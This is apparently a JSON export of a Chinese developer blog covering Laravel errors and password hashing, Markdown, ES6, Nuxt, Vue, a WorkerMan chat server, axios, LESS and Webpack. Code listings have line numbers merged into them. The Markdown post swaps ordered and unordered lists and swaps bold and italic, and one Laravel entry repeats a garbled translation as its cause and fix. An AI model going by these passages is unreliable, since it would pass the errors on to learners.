{"pages":[],"posts":[{"title":"php之laravel学习常见错误2（连载中）","text":"下面是我们整理的php的laravel学习的常见的错误以及解决的办法，我还会持续更新，请关注 错误1：错误代码：1Symfony \\ Component \\ Debug \\ Exception \\ FatalThrowableError (E_ERROR) 错误原因：1表单提交没有添加“enctype=\"multipart/form-data\"” 解决办法：1在表单添加“enctype=\"multipart/form-data\"”语句 错误2：错误代码：1Call to a member function isValid() on string 错误原因：1表单“enctype=\"multipart/form-data\"”单词写错 解决办法：1在表单“enctype=\"multipart/form-data\"”修改正确 错误3：错误代码：12ErrorException (E_ERROR)Missing required parameters for [Route: doedit] [URI: doedit/{id}]. (View: D:\\shixiaoxia\\larave\\resources\\views\\blog\\modify.blade.php) 错误原因：1显示页面提交的时候缺少参数，id 解决办法：1在前台页面form表单提交的时候添加当前id的参数 错误4：错误代码：12Symfony \\ Component \\ Debug \\ Exception \\ FatalThrowableError (E_ERROR)Call to undefined function App\\Http\\Controllers\\data() 错误原因：1找不到函数data 时间函数写错 解决办法：1把函数的data改成date 错误5：错误代码：12BadMethodCallExceptionMethod [login] does not exist. 错误原因：1方法[login]不存在。 解决办法：1在web.php中配置路由的时候没有书写get 例:route::get(\"/xxx\",\"xxx@controller\")-&gt;name(\"xxx\"); 错误6：错误代码：1Class 'App\\Http\\Controllers\\Storage' not found 错误原因：12HTML没有引入Storage这个类 解决办法：1在相应的类中引入类，比如use Storage","link":"/2018/11/15/2/"},{"title":"php之laravel学习常见错误1（连载中）","text":"下面是我们整理的php的laravel学习的常见的错误以及解决的办法，我还会持续更新，请关注 错误1：错误代码：1Symfony \\ Component \\ HttpKernel \\ Exception \\MethodNotAllowedHttpException 错误原因：1方法里边的参数写错了，文件引入错误! 解决办法：1把参数改回原来的，并且检查文件的路径 错误2：错误代码：1Type error: Too few arguments to function App\\Http\\Controllers\\IndexController::blog(), 0 passed and exactly 1 expected 错误原因：1语法错误 解决办法：1把IndexController中的blog方法的括号里的\"$id\"去掉。 错误3：错误代码：1Route [blog.doadd] not defined. (View: E:\\laravel55\\resources\\views\\Blog\\add.blade.php) 错误原因：1没有在routes\\web.php中设置doadd路由 解决办法：1在routes\\web.php中设置doadd路由 错误4：错误代码：1Class App\\Http\\Request\\BlogRequest does not exist 错误原因：1BlogRequest的末尾没有加s 解决办法：1在BlogRequest的末尾加s","link":"/2018/11/15/1/"},{"title":"php之laravel学习常见错误4（连载中）","text":"下面是我们整理的php的laravel学习的常见的错误以及解决的办法，我还会持续更新，请关注 错误1：错误代码：1Driver [] is not supported. (View: E:\\www2017\\laravel\\resources\\views\\Blog\\list.blade.php) 错误原因：1单词写错 解决办法：1把\"iamge \"改为\"image\" 错误2：错误代码：1Undefined variable: blogs (View: E:\\www2017\\laravel\\resources\\views\\Blog\\list.blade.php) 错误原因：1单词写错 解决办法：1把\"list\"改为\"edit\" 错误3：错误代码：1Undefined variable: id 错误原因：1少写参数 解决办法：1在标记的地方加“ $id ” 错误4：错误代码：12InvalidArgumentExceptionView [Index.index] not found. 错误原因：1找不到视图文件 index 解决办法：1前台页面命名的时候 文件名.balde.php 错误5：错误代码：1Driver [] is not supported. 错误原因：1图片的上传路径有问题 解决办法：1修改了参数原因是在config/filesystems中配置的事upload为文件上传 错误6：错误代码：1SQLSTATE[42000]: Syntax error or access violation: 1055 Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'sns.sns_users.md_img' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by (SQL: select `sns_users`.`md_img`, `phone`, `sns_users`.`id` from `sns_blogs` left join `sns_users` on `user_id` = `sns_users`.`id` where date(sns_blogs.created_at) &gt;= DATE_SUB(CURDATE(), INTERVAL 2 DAY) group by `phone` order by count(*) desc limit 9) 错误原因：1配置文件没修改正确 解决办法：1config -&gt;database.php-&gt;'strict'=&gt;false","link":"/2018/11/15/4/"},{"title":"markdown基础语法","text":"（1）php开发常用命令12php -S localhost:4444 -t public启动laravel自带的HTTP服务器，端口为4444，网站路径为public （2）markdown常用语法 写一些命令预防自己忘记 本文参考自：https://www.cnblogs.com/liugang-vip/p/6337580.html （2.1）标题的写法1234567# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题####### 七级标题 （2.2）列表的写法12345678有序列表：* 列表1* 列表2* 列表3无序列表：1. 列表12. 列表23. 列表3 （2.3区块引用）1234567&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用&gt;&gt;&gt;&gt;&gt; 五级引用&gt;&gt;&gt;&gt;&gt;&gt; 六级引用&gt;&gt;&gt;&gt;&gt;&gt;&gt; 七级引用 （2.4）华丽的分割线1--- 这个是华丽的分割线 （2.5）跳转链接123456点击文字跳转：点击[这里](http://www.baidu.com)，跳转到百度 点击图片跳转：点击![这张图片](http://www.baidu.com/img/bd_logo1.png)，跳转到百度 （2.6）代码框12这个标签``` ``` 之间写代码 （2.7）表格的写法123456| 名字 | 年龄 | 性别 ||:---: |:---:|:---:||淡定|18|男||淡定|20|妖|冒号：冒号表示对齐方式，写在左边表示左对齐，右边为右对齐，两边都写表示居中 （2.8）强调12* * 字体加粗** ** 字体倾斜 （2.9）删除线1~~ ~~ 删除某段文字，两边没有空格","link":"/2018/11/15/5/"},{"title":"总结一下laravel中Hash::make()遇到的坑","text":"今天由于项目的需要，博主需要做一个修改密码的功能，项目用到的是laravel框架，但是没想到他里面的Hash::make()跟之前写过的md5()有很大的差别，下面总结一下，项目的具体信息请前往我的github 前端界面12345678910111213141516171819202122232425262728{{--修改密码--}}&lt;form action=\"{{ route('changepwd') }}\" method=\"post\"&gt; {{{ csrf_field() }}} &lt;div class=\"layui-form-item\"&gt; &lt;label for=\"L_nowpass\" class=\"layui-form-label\"&gt;当前密码&lt;/label&gt; &lt;div class=\"layui-input-inline\"&gt; &lt;input type=\"password\" id=\"L_nowpass\" name=\"oldpass\" required lay-verify=\"required\" autocomplete=\"off\" class=\"layui-input\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"layui-form-item\"&gt; &lt;label for=\"L_pass\" class=\"layui-form-label\"&gt;新密码&lt;/label&gt; &lt;div class=\"layui-input-inline\"&gt; &lt;input type=\"password\" id=\"L_pass\" name=\"password\" required lay-verify=\"required\" autocomplete=\"off\" class=\"layui-input\"&gt; &lt;/div&gt; &lt;div class=\"layui-form-mid layui-word-aux\"&gt;6到16个字符&lt;/div&gt; &lt;/div&gt; &lt;div class=\"layui-form-item\"&gt; &lt;label for=\"L_repass\" class=\"layui-form-label\"&gt;确认密码&lt;/label&gt; &lt;div class=\"layui-input-inline\"&gt; &lt;input type=\"password\" id=\"L_repass\" name=\"password_confirmation\" required lay-verify=\"required\" autocomplete=\"off\" class=\"layui-input\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"layui-form-item\"&gt; &lt;button class=\"layui-btn\" key=\"set-mine\" lay-filter=\"*\" &gt;确认修改&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;{{--修改密码--}} 路由文件12//修改用户密码Route::post('/changepwd', 'PasswordController@changepwd')-&gt;name('changepwd'); Request验证类1234567891011121314151617181920212223242526272829&lt;?phpnamespace App\\Http\\Requests;use Illuminate\\Foundation\\Http\\FormRequest;class PasswordRequest extends FormRequest{ /** * Determine if the user is authorized to make this request. * * @return bool */ public function authorize() { return true; } /** * Get the validation rules that apply to the request. * * @return array */ public function rules() { return [ 'password'=&gt;'required|min:6|max:16|confirmed', // confirmed: password 和 password_confirmation是否相同 ]; }} 控制器引入类12use DB;use Hash; 控制器代码123456789101112131415161718192021//修改密码public function changepwd(PasswordRequest $req){ $users = DB::table('users') -&gt;where('id', '=', session('id')) -&gt;first(); //判断用户输入的密码与数据库的密码是否一致 // 表单中的密码：$req-&gt;password （原始） // 数据库的密码：$user-&gt;password （哈希之后 ） // laravel中 Hash::check(原始，哈希之后)判断是否一致 if( Hash::check( $req-&gt;oldpass , $users-&gt;password ) ){ //更新密码并且保存 DB::table('users') -&gt;where('id', session('id')) -&gt;update(['password' =&gt; Hash::make($req-&gt;password)]); // 跳转到 登录页 return redirect()-&gt;route('login'); }else{ return back()-&gt;withErrors(['oldpass'=&gt;'密码不正确！']); }} ==这里遇到的坑就是laravel框架中，每次hash的值都是不一致的，跟之前写过的md5不一样，md5是唯一的，但是只要保存进去了，就算hash以后的值是不一样的，但是都是代表一个东西的，比如说，你hash的是111111，就算hash两次的值不一致，但是并不会影响你的代码逻辑的，只要正常判断即可，laravel不愧为排名第一的框架，果然很优雅！！！！==","link":"/2018/11/15/8/"},{"title":"php之laravel学习常见错误3（连载中）","text":"下面是我们整理的php的laravel学习的常见的错误以及解决的办法，我还会持续更新，请关注 错误1：错误代码：1No message 错误原因：1查看这个路由参数，缺少参数 解决办法：1此路由缺少参数 错误2：错误代码：1localhost/ Failed to load resource: the server responded with a status of 404 错误原因：1图片找不到 解决办法：1在报错的img中添加src 错误3：错误代码：1Invalid argument supplied for foreach() (View: D:\\Laravel\\resources\\views\\Personal\\qtspace.blade.php) 错误原因：1sql错误 解决办法：1将 Blog::where('user_id',$user_id)-&gt;whereIn('accessable',['public','protected'])-&gt;toSql() 改为 Blog::where('user_id',$user_id) -&gt;whereIn('accessable',['public','protected'])-&gt;get(); 错误4：错误代码：1Parse error: syntax error, unexpected '$data' (T_VARIABLE), expecting ',' or ')' (View: D:\\shixiaoxia\\laravel123\\test\\resources\\views\\face\\face.blade.php 错误原因：1解析错误：语法错误、意想不到的“$DATA”（TY变量）、期望“、”或“”（视图：D:\\ SHIXXIIA\\LARAVEL123\\Test\\Reals\\View \\Foo\\FACE.BLADE.PHP 解决办法：1解析错误：语法错误、意想不到的“$DATA”（TY变量）、期望“、”或“”（视图：D:\\ SHIXXIIA\\LARAVEL123\\Test\\Reals\\View \\Foo\\FACE.BLADE.PHP 错误5：错误代码：1Class App\\Http\\Request\\FaceRequest does not exist. 错误原因：1找不到类 解决办法：1在request后边添加s","link":"/2018/11/15/3/"},{"title":"ECMAScript 6介绍","text":"ECMAScript 6.0（以下简称ES6）是JavaScript语言的下一代标准，已经在2015年6月正式发布了。它的目标，是使得JavaScript语言可以用来编写复杂的大型应用程序，成为企业级开发语言。标准的制定者有计划，以后每年发布一次标准，使用年份作为版本。因为ES6的第一个版本是在2015年发布的，所以又称ECMAScript 2015（简称ES2015）。2016年6月，小幅修订的《ECMAScript2016标准》（简称ES2016）如期发布。由于变动非常小（只新增了数组实例的includes方法和指数运算符），因此 ES2016 与 ES2015 基本上是同一个标准，都被看作是ES6。根据计划，2017年6月将发布ES2017。—以上内容来自W3Cschool 使用let声明变量在es6中我们使用let声明变量,但是为什么要使用let声明变量?下面来比较一下用var声明变量跟使用let声明变量的区别使用var 声明变量123456789101112131415161718192021// 使用var 声明变量 var bVariable = \"变量\";// 存在的问题:// 1.var命令会发生”变量提升“现象，即变量可以在声明之前使用，值为undefined console.log(name); // 此时输出undefined var name = \"张三\";// 2.var命令允许我们重复声明变量，并且不会报错var name = \"jerry\";var name = \"tom\";console.log(name);// 此时输出tom// 3.通过 var 定义的变量，它的作用域是全局作用域或者函数作用域function varvslet() { console.log(i); // 此时输出undefined for (var i = 0; i &lt; 3; i++) { console.log(i); // 0, 1, 2 };} 使用let 声明变量123456789101112131415161718192021222324252627//1.声明的变量仅在块级作用域有效 { let name = \"zhangsan\"; } console.log(name); // 此时name不会被访问到，因为let会构成块级作用域 { var name1 = \"lisi\"; } console.log(name); // 此时name会被访问到，因为var会构成全局作用域//2.不存在变量提升，不存在预解析 console.log(family); var family = \"张三\";// 上面的代码实际上会发生预解析，解析成下面的代码，会先定义family var family; console.log(family);// 此时输出undefined family =\"张三\";//但是使用let，则不会出现这种情况console.log(name); //不会输出undefined，直接出现暂时性死区let name=\"张三\";//3.暂时性死区//指程序报错终止执行//4.不允许重复声明let name=\"张三\";let name=\"李四\"; //此时不允许重复定义: Identifier 'name' has already been declared 使用const声明常量js中并没有声明常量的关键字，在es6中，出现了可以声明常量的关键字，const1const name=\"张三\"; 声明时必须赋值,否则报错 只在块级作用域有效 存在暂时性死区 不可重复声明 当常量是对象时，对象本身是可变的,依然可以添加新属性 了解基本数据类型以及复杂数据类型 ES6中的字符串ES6之前：12345678910111213141516171819202122232425262728// 1.需要使用拼接字符串 var html = '&lt;header&gt;' + '&lt;a class=\"back\" href=\"javascript:;\"&gt;' + '&lt;i&gt;&lt;/i&gt;' + '&lt;span&gt;优惠活动&lt;/span&gt;' + '&lt;/a&gt;' + '&lt;/header&gt;';// 2.如果上面的\"优惠活动\"是变量 var title = \"优惠活动\"; var html = '&lt;header&gt;' + '&lt;a class=\"back\" href=\"javascript:;\"&gt;' + '&lt;i&gt;&lt;/i&gt;' + '&lt;span&gt;' + title + '&lt;/span&gt;' + '&lt;/a&gt;' + '&lt;/header&gt;';// 3.如果有一个字符串\"Hello World\",如何遍历 var str = \"Hello World\"; for (var i = 0; i &lt; str.length; i++) { console.log(str[i]); } ES6之中：123456789101112131415161718192021222324252627// 1.不需要使用拼接字符串,直接使用模板字符串 let html = ` &lt;header&gt; &lt;a class=\"back\" href=\"javascript:;\"&gt; &lt;i&gt;&lt;/i&gt; &lt;span&gt;优惠活动&lt;/span&gt; &lt;/a&gt; &lt;/header&gt;`;// 2.如果上面的'优惠活动'是变量,也不需要使用拼接字符串的方式 只需要把变量写在这样的格式中 ${变量} var title = \"优惠活动\"; let html = ` &lt;header&gt; &lt;a class=\"back\" href=\"javascript:;\"&gt; &lt;i&gt;&lt;/i&gt; &lt;span&gt;${title}&lt;/span&gt; &lt;/a&gt; &lt;/header&gt;`;// 3. 使用for...of var str = \"HelloWorld\"; for(let i of str) { console.log(i); } ES6中的函数rest参数ES6之前：1234567// 1.函数接受任意个数的参数并排序 var sortNumber = function () { return Array.prototype.slice.call(arguments).sort(); //此时arguments是类数组，可以遍历 可以有length属但是不能有数组的方法 //Array.prototype.slice.call()就是把类数组转换成数组 } console.log(sortNumber(2,3,1,4,5,9,0)); ES6之中：1234567891011// 1.函数接受任意个数的参数并排序function add(...rest) { console.log(rest);//此时rest是数组 red.sort(); console.log(rest);}add(1,4,3,5,2,7,9,0,6);&lt;!--注意:arguments是类数组，rest是数组，--&gt;&lt;!--rest参数之后不能再有其他参数（即只能是最后一个参数），--&gt;&lt;!--否则会报错。--&gt; 箭头函数ES6之前：1234//匿名函数写法 var add = function (x,y) { return x + y; } ES6之中：123//匿名函数写法 var add = (x,y) =&gt; {return x+y}; //注意： 箭头函数不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 解构赋值ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构(Destructuring)。123456789//数组解构赋值 var [a,b,c] = [1,2]; console.log(a,b,c); var [a,b] = [1,2,4]; //对象解构赋值 var obj = {a: 1,b: 2} var {a,b} ={a:1, b:2} console.log(a,b);","link":"/2018/11/15/ECMAScript 6介绍/"},{"title":"Nuxt基本安装与使用","text":"Nuxt 是基于 nodejs + vue 写的，服务器端渲染 框架（SSR） 安装 安装node.js 设置node使用淘宝镜像 12npm install -g nrmnrm use taobao 使用 npm 安装 vue-cli 1npm install -g vue-cli 安装nuxt项目 1vue init nuxt-community/starter-template 项目名称 如果 vue-cli 没有安装, 需先通过 npm install -g vue-cli 来安装。 启动项目：npm run dev目录结构 页面组件页面组件代码结构：1234567891011121314&lt;template&gt; 模板内容(html内容，注意：必须有一个根元素)&lt;/template&gt;&lt;script&gt;// 组件的JS部分export default {}&lt;/script&gt;&lt;style&gt; 组件的CSS部分&lt;/style&gt; 布局文件 如果项目中存在 layouts/default.vue文件，那么Nuxt在渲染每个页面时，都会使用这个 defaults.vue 文件做为布局文件 如果希望页面使用其它的布局文件可以在页面中使用 layout 来设置：1234567891011121314&lt;template&gt; &lt;div class=\"container\"&gt; &lt;h1 v-if=\"error.statusCode === 404\"&gt;页面不存在&lt;/h1&gt; &lt;h1 v-else&gt;应用发生错误异常&lt;/h1&gt; &lt;nuxt-link to=\"/\"&gt;首 页&lt;/nuxt-link&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { props: ['error'], layout: 'blog' // 你可以为错误页面指定自定义的布局}&lt;/script&gt; 打包资源 npm run dev 支持热更新，开发模式启动服务器 npm run build 网站上线前打包 npm run start 生产环境启动服务器 参数的接收方式 用来唯一标识资源的参数写到路由上，比如：/goods/:id 搜索、排序、翻页等的参数，比如：/goods/?limit=xx&amp;page=xx 两种参数与文件名总结 URL 对应页面 接收方式 /goods/:id pages/goods/_id.vue this.$route.params.id /goods?id=x pages/goods.vue this.$route.query.id /order/:catid/:userid/?limit=10 pages/order/_catid/_userid.vue 使用 this.$route 中的 params 和 query 来分别接收两种参数。","link":"/2018/11/15/Nuxt基本安装与使用/"},{"title":"Vue之事件与函数","text":"记录常用的事件以及函数 修饰符 .stop：阻止事件继续传播 .prevent：组上事件的默认行为 .capture：事件在捕获阶段执行 .once：事件只被触发执行一次 按键修饰符 .enter：点击回车键 .tab：点击tab键 .delete：点击删除键 .esc：点击 esc 按键 .space：点击空格键 .up：点击上箭头 .down：点击下箭头 .left：点击左箭头 .right：点击右箭头 .数字：按键的数字编号 生命周期钩子 beforeCreated：创建前 created：创建后 beforeMount：挂载到页面前 mounted：挂载到页面后 beforeUpdate：更新页面前 updated：更新页面后 beforeDestroy：消销Vue之前 destroyed：消销Vue之后 计算属性123computed:{ ... } 自定义组件123Vue.component('hello', { template: `&lt;p&gt;Hello World !&lt;/p&gt;`}) 注意点： 组件中的 data 要求必须是一个函数 使用 props 组件上所有属性的名字","link":"/2018/11/15/Vue之事件与函数/"},{"title":"windows下WorkerMan实现简单的多人在线聊天","text":"博主做项目遇到了在网页中需要实现在线聊天的功能，我一看，一脸懵逼，完全没有思路，最后得益于万能的百度，终于知道了websocket这种神奇的协议，还知道了WorkerMan这个神奇的PHP socket服务器框架，下面我们来简单聊聊WorkerMan的简单使用，楼主水平有限，如果有错误，欢迎大家在下面的评论区指出~~ 1，介绍：Workerman是什么？Workerman是一款纯PHP开发的开源高性能的PHP socket 服务框架。 Workerman不是重复造轮子，它不是一个MVC框架，而是一个更底层更通用的socket服务框架，你可以用它开发tcp代理、梯子代理、做游戏服务器、邮件服务器、ftp服务器、甚至开发一个php版本的redis、php版本的数据库、php版本的nginx、php版本的php-fpm等等。Workerman可以说是PHP领域的一次创新，让开发者彻底摆脱了PHP只能做WEB的束缚。 实际上Workerman类似一个PHP版本的nginx，核心也是多进程+Epoll+非阻塞IO。Workerman每个进程能维持上万并发连接。由于本身常住内存，不依赖Apache、nginx、php-fpm这些容器，拥有超高的性能。同时支持TCP、UDP、UNIXSOCKET，支持长连接，支持Websocket、HTTP、WSS、HTTPS等通讯协以及各种自定义协议。拥有定时器、异步socket客户端、异步Mysql、异步Redis、异步Http、异步消息队列等众多高性能组件。以上内容来自WorkerMan手册介绍，地址http://doc3.workerman.net/640361 2，环境配置，Workerman是基于php的，所以我们需要先配置好php环境（配置好的可以忽略），需要配置好环境变量，这个请自行百度解决，使用php -v 查看php 版本，如下图，环境就是配置成功的了，就可以继续下一步的操作！ 3，下载Workerman到Workerman官网下载Workerman,如下图： 4，使用把下载下来的压缩包解压，并在文件夹中新建一个start.php的文件把以下代码复制进去！1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpuse Workerman\\Worker;//Autoloader.php路径require_once \"./Autoloader.php\";$global_uid = 0;// 当客户端连上来时分配uid，并保存连接，并通知所有客户端function handle_connection($connection){ global $text_worker, $global_uid; // 为这个连接分配一个uid $connection-&gt;uid = ++$global_uid;}// 当客户端发送消息过来时，转发给所有人function handle_message($connection, $data){ global $text_worker; foreach($text_worker-&gt;connections as $conn) { $conn-&gt;send(\"user[{$connection-&gt;uid}] said: $data\"); }}// 当客户端断开时，广播给所有客户端function handle_close($connection){ global $text_worker; foreach($text_worker-&gt;connections as $conn) { $conn-&gt;send(\"user[{$connection-&gt;uid}] logout\"); }}// 创建一个文本协议的Worker监听2347接口$text_worker = new Worker(\"text://127.0.0.1:2347\");// 只启动1个进程，这样方便客户端之间传输数据$text_worker-&gt;count = 1;$text_worker-&gt;onConnect = 'handle_connection';$text_worker-&gt;onMessage = 'handle_message';$text_worker-&gt;onClose = 'handle_close';Worker::runAll(); 5,运行在当前文件夹打开终端，并输入php start.php start 打开socket服务，如图：打开多几个客户端并输入命令：telnet 127.0.0.1 2347 测试,如下图，则代表测试成功：","link":"/2018/11/15/WorkerMan入门1/"},{"title":"axios","text":"axios 是 Vue 推荐的一款基于 Promise 的 AJAX 组件。所以我们在使用 Vue 进行项目开发时一般都使用这个库来执行 AJAX 请求。 发送请求 axios.get(url[,config])：发送GET请求 axios.post(url,data)：发送POST请求 axios.put(url,data[,config])：发送PUT请求 axios.delete(url[,config])：发送DELETE请求 axios.options(url[,config])：发送OPTIONS请求 axios.patch(url,data[,config])：发送PATCH请求 axios.head(url[,config])：发送HEAD请求 axios.request(config)：发送各种请求 PromisePromise对象中提供了两个方法 then 和 catch： then：请求执行成功时调用 catch：请求失败时调用1234567891011121314151617181920212223242526272829// 执行请求返回 Promise 对象var ajax = axios.get('https://api.myjson.com/bins/nx1ge')ajax.then((res)=&gt;{ console.log( res.data ) // 返回的数据 console.log( res.status ) // 状态码 console.log( res.statusText ) // 状态码文本 console.log( res.headers ) // 响应的协议头信息 console.log( res.config ) // 请求的参数 console.log( res.request ) // 原生 XMLHttpRequest 对象}).catch((err)=&gt;{ // 发送了请求，并且成功，但服务器返回状态码不是2xx时执行 if (error.response) { console.log(error.response.data); console.log(error.response.status); console.log(error.response.headers); } // 发送了请求，但服务器没有返回响应时执行 else if (error.request) { // error.request 是原生的 XMLHttpRequest 对象 console.log(error.request); } // 发送请求时出错 else { console.log('Error', error.message); } // 请求的配置项 console.log(error.config);}) axios配置 配置项 说明 url 请求地址 method 请求方法，默认是 default baseURL 请求时的基地址 headers 设置 HTTP 头信息 params 请求时 URL 上的参数 data 请求时提交的数据，主要在PUT、POST、PATCH时使用 timeout 请求超时时间，单位：毫秒 responseType 指明服务器返回数据的类型，默认是JSON onUploadProgress 上传文件时处理上传进程的回调函数 onDownloadProgress 下载时处理下载进度的回调函数 拦截器在发送 AJAX请求前和处理AJAX响应前对数据进行拦截处理1234567891011121314151617// 在所有请求之前执行的代码axios.interceptors.request.use(function (config) { // 处理请求前代码 return config; }, function (error) { // Do something with request error return Promise.reject(error); }); // 当服务器返回数据时执行的代码axios.interceptors.response.use(function (response) { // 请求成功时，拦截的代码 return response; }, function (error) { // 请求失败时，拦截的代码 return Promise.reject(error); });","link":"/2018/11/15/axios/"},{"title":"css3之LESS简单入门","text":"CSS（层叠样式表）是一项出色的技术作为一门标记性语言，CSS 的先天性优点是语法相对简单，对使用者的要求较低，但它的致命弱点是需要书写大量看似没有逻辑的代码，不方便维护及扩展，不利于复用。造成这一现象的很大原因在于CSS是一门非程序式语言，没有变量、函数、SCOPE（作用域）等概念。Less的出现，为Web开发者带来了福音，它是一门CSS预处理语言，引入了变量、运算、函数、继承等功能，为CSS语言赋予了动态语言的特性。Less大大简化了CSS的编写，并且降低了CSS的维护成本。就像它的名称所说的那样，Less可以让我们用更少的代码做更多的事情。 语法1.注释123// 单行注释 不会编译到css中/* 多行注释 会编译到css中 */ 2.变量123456789101112131415161718192021// 语法: @变量名: 值@white: #fff;@bgColor: #ccc;@fontSize: 22px;// 多值变量@normalSize: 20px 30px 40px 50px;body { background-color:@bgColor;}main { color: @bgColor; background-color: @white; font-size:@fontSize; padding:@normalSize;}aside { font-size:@fontSize; margin:@normalSize;} 3.嵌套(尽量不要嵌套超过三层)123456789101112131415161718192021.container { h1 { font-size: 25px; color: #e45456; } p { font-size: 25px; color: #3c7949; } .myclass { h1 { font-size: 25px; color: #e45456; } p { font-size: 25px; color: #3c7949; } }} 父选择器符号(&amp;) 直接子选则器符号(&gt;)123456789101112131415161718192021.container { &gt; h1 { font-size: 25px; color: #e45456; } &gt; p { font-size: 25px; color: #3c7949; } .myclass { h1 { font-size: 25px; color: #e45456; } p { font-size: 25px; color: #3c7949; } }} 5.四则运算1234.box { width: 20px*3 + 10; height: 30px/3-2; } 6.函数123456789101112131415161718192021222324.effect(@normal:yellow, @hover:orange, @visited:darkorange, @active:green) { color: @normal; &amp;:hover { color: @hover; } &amp;:visited { color: @visited; } &amp;:active { color: @active; }}a { // .effect(red,green,blue,black); .effect()}.box { .effect(pink,hotpink,lightpink,white);} 7.导入12不同的功能 要把这些代码放到不同的文件中格式: @import \"src\" 8.继承12345678910111213141516aside { font-size:24px; margin:20px 30px 40px 50px; border:1px solid #ccc;}main { color:#ccc; background-color:#fff; // font-size:24px; // padding:20px 30px 40px 50px; &amp;:extend(aside); border:none;}","link":"/2018/11/15/css3之LESS简单入门/"},{"title":"Webpack基本使用","text":"Webpack介绍:主要用于web项目中打包资源进行自动构建,Webpack将所有资源视为JS的模块来进行构建，所以对于CSS，Image等非JS类型的文件，Webpack会使用相应的加载(loader)器来加载成其可识别的JS模块资源,通过配置一些信息，就能将资源进行打包构建，更好地实现前端的工程化 Webpack安装本地安装:12npm install -D webpack-D 实际上是简写 --dev-save 如果你使用Webpack 4+ 版本, 你还需要安装CLI. 1npm install -D webpack-cli 要安装特定版本1npm install -D webpack@&lt;version&gt; 全局安装:1npm install -g webpack 配置项简介： Entry，入口文件配置,Webpack执行构建的第一步将从entry开始,完成整个工程的打包 Module，模块,在Webpack里,一切皆模块,Webpack会从配置的entry开始递归找出所有依赖的模块,最常用的是rules配置项,功能是匹配对应的后缀,从而针对代码文件完成格式转换和压缩合并等指定的操作. Loader，模块转换器,用于把模块原内容按照需求转换成新内容,这个是配合Module模块中的rules中的配置项来使用. Plugins，扩展插件,在Webpack构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要做的事情.(插件API) Output，输出结果,在Webpack经过一系列处理并得出最终想要的代码后输出结果,配置项用于指定输出文件夹,默认是./dist 基本使用把src的代码编译到dist目录中 project 123456789handle|- package.json|- webpack.config.js|- index.html|- /src |- index.js |- mixin.js|- /dist |- bundle.js src/index.js12import content from \"./mixin\";document.body.appendChild(content(\"webpack\")); src/mixin.js 123456module.exports = function (con) { var element = document.createElement('div'); element.innerHTML = 'Hello, ' + con; return element;} index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;起步&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=\"./dist/bundle.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; .npmrc 1registry=https://registry.npm.taobao.org webpack.config.js 12345678910111213const path = require('path');module.exports = { // 打包的入口点 entry: './src/index.js', // 打包的输出点 output: { // 打包之后输出文件的名称 filename: 'bundle.js', // 打包之后输出文件的路径 path: path.resolve(__dirname, 'dist') }} 总结webpack 的基本使用方式 : 配置package.json的start命令为webpack 创建webpack.config.js 指定项目打包的入口 指定项目打包后文件的名称和输出路径 配置代码错误源如果报错了，是这样子的： 我们需要知道代码的具体错误,如图： 修改配置文件： webpack.config.js 123devtool: 'inline-source-map',&lt;!--去掉警告提示--&gt;mode: 'none' webpack加载CSS下载包1npm install -D style-loader css-loader 引入资源 src/js/index.js 12// 引入cssimport '../css/main.css' 修改配置文件 webpack.config.js1234567891011module: { rules: [ // 加载css { // 找到css文件() test: /\\.css$/, // 需要转换器(需要什么转换器 都是大家都知道的 style-loader css-loader) use: ['style-loader', 'css-loader'] }, ]} webpack加载图片下载包1npm install -D file-loader 引入资源 src/js/index.js 12// 引入图片const imgSrc = require('../image/chrome.png'); 修改配置文件 webpack.config.js123456rules: [ { test: /\\.(png|jpe?g|gif|svg)$/, use: ['file-loader'] }] webpack加载字体 下载字体 定义字体 1234@font-face { font-family: 'wanlum'; src: url(\"../fonts/Raleway.ttf\");} 使用字体 12345div { font-family: 'wanlum'; color: red; font-size: 30px;} 配置webpack.config.js 123456{ test: /\\.(woff|woff2|eot|ttf|otf)$/, use: [ 'file-loader' ]} webpack编译ES6 下载包 1npm install -D babel-cli babel-preset-env babel-loader 编辑配置文件 .babelrc 12345{ \"presets\": [ \"env\" ]} 配置webpack.config.js 1234567{ test: /\\.js$/, exclude: /node_modules/, use: { loader: 'babel-loader' } } less编译成css 下载包 1npm install less-loader less -D 配置webpack.config.js 1234{ test: /\\.less$/, use: ['style-loader','css-loader', 'less-loader'] }, html自动生成 下载包 1npm install -D html-webpack-plugin clean-webpack-plugin 引入包 1234// 重新生成html的const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);// 清理dist目录const CleanWebpackPlugin = require(&apos;clean-webpack-plugin&apos;); 配置webpack.config.js 1234567plugins: [ new HtmlWebpackPlugin({ title: &quot;你好&quot; }), // 清理dist目录 new CleanWebpackPlugin([&apos;dist&apos;])], 自动编译实时加载 下载包 1npm install -D webpack-dev-server 配置webpack.config.js 123devServer: { contentBase: './dist'} 配置package.json启动项 1\"start\": \"webpack-dev-server --config webpack.config.js\" 热替换(跟自动编译实时加载功能差不多) 配置webpack.config.js1234567891011plugins: [ new HtmlWebpackPlugin({ title: '使用HtmlWebpackPlugin' }), new webpack.NamedModulesPlugin(['dist']), new webpack.HotModuleReplacementPlugin(['dist'])], devServer: { contentBase: path.resolve(__dirname,'dist'), hot: true }","link":"/2018/11/15/Webpack基本使用/"},{"title":"使用cropper实现图片裁剪功能并保存图片到数据库","text":"今天实现了图片裁剪上传的功能，写下这篇blog，预防以后忘记 